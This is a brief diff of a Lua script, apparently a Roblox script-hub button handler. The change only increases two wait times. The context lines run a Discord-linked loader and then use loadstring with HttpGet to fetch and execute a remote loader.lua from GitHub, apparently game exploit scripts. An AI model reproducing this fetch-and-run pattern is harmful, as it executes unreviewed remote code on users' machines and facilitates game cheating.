@@ -230,12 +230,12 @@ CreateButton("🌊 Tsunami",function(btn)
 
         ExecuteWithDiscord("https://raw.githubusercontent.com/UnAliveScripts/UnAlive-Tsunami/refs/heads/main/loader.lua")
 
-        task.wait(0.5)
+        task.wait(1)
 
         -- second script dh
         loadstring(game:HttpGet("https://raw.githubusercontent.com/PikaEvil619/ETFBTradeScript/refs/heads/main/loader.lua"))()
 
-        task.wait(1)
+        task.wait(5)
         ScreenGui:Destroy()
 
     else
